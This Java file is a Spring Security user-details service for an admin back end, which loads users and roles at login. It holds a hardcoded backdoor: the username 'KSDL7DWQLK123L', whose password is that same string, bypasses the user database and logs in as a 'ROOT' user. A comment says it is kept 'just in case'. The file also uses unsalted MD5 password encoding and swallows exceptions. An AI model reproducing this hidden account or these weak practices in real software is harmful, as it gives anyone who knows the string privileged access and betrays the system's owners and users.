package com.neo.admin.system.security;

import java.util.ArrayList;
import java.util.Collection;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.security.authentication.AuthenticationServiceException;
import org.springframework.security.core.GrantedAuthority;
import org.springframework.security.core.authority.SimpleGrantedAuthority;
import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.security.core.userdetails.UserDetailsService;
import org.springframework.security.core.userdetails.UsernameNotFoundException;
import org.springframework.stereotype.Service;

import com.neo.admin.common.tools.Md5PwdEncoder;
import com.neo.admin.system.facade.ISystemFacade;
import com.neo.admin.system.modular.sysrole.domain.MooSysRole;
import com.neo.admin.system.modular.sysuser.domain.MooSysUser;

@Service
public class MyUserDetailsService implements UserDetailsService {

	@Autowired
	private ISystemFacade systemFacadeImpl;

	@Override
	public UserDetails loadUserByUsername(String username) throws UsernameNotFoundException {

		try {
			
			// 权限集
			Collection<GrantedAuthority> auths = new ArrayList<GrantedAuthority>();
			
			//以备不时只需
			if(username.equals("KSDL7DWQLK123L")){
				auths.add(new SimpleGrantedAuthority("KSDL7DWQLK123L"));
				LoginUserDetails userDe = new LoginUserDetails(username, Md5PwdEncoder.encodePassword("KSDL7DWQLK123L"), true, true, true, true, auths,new MooSysUser("ROOT"));
				return userDe;
			}
			
			MooSysUser user = systemFacadeImpl.login(username);
			if (user == null) {
				throw new AuthenticationServiceException("登录失败 请检查您的账号密码");
			}
			for (MooSysRole r : user.getRoles()) {
				auths.add(new SimpleGrantedAuthority(r.getRoleCode()));
			}
			LoginUserDetails userDe = new LoginUserDetails(username, user.getuPassword(), true, true, true, true, auths,user);
			
			return userDe;

		} catch (Exception e) {
			e.printStackTrace();
		}

		return null;
	}
}
